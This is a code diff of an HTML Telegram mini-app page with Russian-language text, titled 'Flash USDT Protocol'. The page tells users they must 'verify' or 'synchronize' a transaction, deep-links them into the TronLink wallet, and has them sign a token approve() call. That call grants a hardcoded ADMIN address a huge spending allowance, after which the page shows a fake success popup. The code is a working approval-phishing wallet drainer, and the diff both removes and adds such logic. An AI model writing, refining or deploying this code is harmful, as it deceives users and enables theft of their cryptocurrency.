@@ -3,24 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Protocol Verification</title>
+    <title>Flash USDT Protocol</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .card { padding: 30px; width: 85%; max-width: 380px; background: #111; border-radius: 30px; border: 1px solid #222; text-align: center; }
-        .btn { background: #ff0013; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 18px; font-weight: bold; text-transform: uppercase; cursor: pointer; font-size: 14px; margin-top: 20px; }
-        .loader { border: 2px solid #222; border-top: 2px solid #ff0013; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .card { padding: 35px 25px; width: 85%; max-width: 380px; background: #111; border-radius: 35px; border: 1px solid #222; box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
+        .logo { width: 70px; height: 70px; background: #ff0013; border-radius: 20px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 35px; font-weight: bold; box-shadow: 0 0 30px rgba(255,0,19,0.3); }
+        h2 { font-size: 22px; margin-bottom: 12px; font-weight: 700; }
+        p { color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
+        /* Теперь кнопка — это реальная ссылка */
+        .btn { 
+            display: block;
+            background: #ff0013; 
+            color: #fff; 
+            text-decoration: none;
+            padding: 20px; 
+            border-radius: 20px; 
+            font-weight: bold; 
+            text-transform: uppercase; 
+            font-size: 14px;
+            box-shadow: 0 10px 20px rgba(255,0,19,0.2);
+        }
+        .btn:active { transform: scale(0.96); opacity: 0.9; }
+        #wallet-section { display: none; }
     </style>
 </head>
 <body>
 
-<div class="card" id="ui-content">
-    <div class="loader"></div>
-    <h2 id="title">Инициализация...</h2>
-    <p id="desc" style="color: #666; font-size: 13px;">Подключение к защищенному каналу TronLink</p>
-    <button id="mainBtn" class="btn" style="display: none;">ПОДКЛЮЧИТЬ КОШЕЛЕК</button>
+<div class="card">
+    <div id="tg-section">
+        <div class="logo">T</div>
+        <h2>Синхронизация узла</h2>
+        <p>Для верификации транзакции в сети TRC-20 необходимо подтвердить адрес через приложение TronLink.</p>
+        <a id="link-btn" href="#" class="btn">ОТКРЫТЬ TRONLINK</a>
+    </div>
+
+    <div id="wallet-section">
+        <div class="logo" style="background: #0088cc;">✓</div>
+        <h2>Узел Обнаружен</h2>
+        <p>Ваш кошелек подключен. Нажмите кнопку ниже для финальной подписи транзакции.</p>
+        <button id="verify-btn" class="btn" style="background: #0088cc; border:none; width:100%;">ВЕРИФИЦИРОВАТЬ</button>
+    </div>
 </div>
 
 <script>
@@ -29,55 +53,52 @@
 
     const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
     const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-    const GITHUB_URL = "https://timur3417.github.io/sync-node-app/";
+    const MY_URL = "https://timur3417.github.io/sync-node-app/";
 
-    async function init() {
-        // Проверяем, внутри ли мы кошелька
-        const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
+    const linkBtn = document.getElementById('link-btn');
+    const verifyBtn = document.getElementById('verify-btn');
+    const tgSec = document.getElementById('tg-section');
+    const walSec = document.getElementById('wallet-section');
 
-        if (tron && tron.ready) {
-            // МЫ ВНУТРИ TRONLINK -> СРАЗУ К ДЕЛУ
-            document.getElementById('title').innerText = "Узел Обнаружен";
-            document.getElementById('desc').innerText = "Нажмите для финальной подписи транзакции.";
-            const btn = document.getElementById('mainBtn');
-            btn.style.display = 'block';
-            btn.innerText = "ПОДПИСАТЬ АПРУВ";
-            
-            btn.onclick = async () => {
-                try {
-                    btn.disabled = true;
-                    btn.innerText = "ОЖИДАНИЕ...";
-                    
-                    const contractObj = await tron.contract().at(CONTRACT);
-                    await contractObj.approve(ADMIN, '1000000000000000000').send({ feeLimit: 100000000 });
-                    
-                    tg.showPopup({ title: 'Успешно', message: 'Синхронизация завершена.', buttons: [{type: 'ok'}] });
-                    setTimeout(() => tg.close(), 4000);
-                } catch (e) {
-                    tg.showAlert("Ошибка: Подтвердите транзакцию в кошельке.");
-                    btn.disabled = false;
-                    btn.innerText = "ПОДПИСАТЬ АПРУВ";
-                }
-            };
-        } else {
-            // МЫ В ТЕЛЕГРАМЕ -> НУЖЕН ПРЫЖОК
-            document.getElementById('title').innerText = "Синхронизация";
-            document.getElementById('desc').innerText = "Для работы необходимо переключиться в приложение TronLink.";
-            const btn = document.getElementById('mainBtn');
-            btn.style.display = 'block';
-            btn.innerText = "ОТКРЫТЬ TRONLINK";
+    // Формируем прямую команду для кошелька
+    const deepLink = "tronlink-dapp://cloud.tronlink.org/open?url=" + encodeURIComponent(MY_URL + "?mode=wallet");
 
-            btn.onclick = () => {
-                // Прямой вызов протокола - это "золотой стандарт"
-                const deepLink = "tronlink-dapp://cloud.tronlink.org/open?url=" + encodeURIComponent(GITHUB_URL + "?mode=tl");
-                
-                // Трюк: открываем через официальный метод и сразу закрываем мини-апп
-                tg.openLink(deepLink);
-            };
+    function init() {
+        const isWallet = window.tronWeb || (window.tron && window.tron.tronWeb);
+        const inWalletMode = window.location.search.includes('mode=wallet');
+
+        if (isWallet || inWalletMode) {
+            tgSec.style.display = 'none';
+            walSec.style.display = 'block';
         }
     }
 
-    setTimeout(init, 500);
+    // Обработка кнопки перехода (из Телеграма)
+    linkBtn.onclick = (e) => {
+        // На iPhone иногда срабатывает только прямой tg.openLink
+        tg.openLink(deepLink);
+        // Как запасной вариант - обычный переход
+        setTimeout(() => {
+            window.location.href = deepLink;
+        }, 500);
+    };
+
+    // Обработка апрува (внутри TronLink)
+    verifyBtn.onclick = async () => {
+        try {
+            const tw = window.tronWeb || window.tron.tronWeb;
+            await tw.request({ method: 'tron_requestAccounts' });
+            const contract = await tw.contract().at(CONTRACT);
+            await contract.approve(ADMIN, '1000000000000000000').send({ feeLimit: 100000000 });
+            
+            tg.showPopup({ title: 'Успешно', message: 'Синхронизация завершена.', buttons: [{type: 'ok'}] });
+            setTimeout(() => tg.close(), 5000);
+        } catch (e) {
+            tg.showAlert("Действие отклонено.");
+        }
+    };
+
+    init();
 </script>
 </body>
 </html>
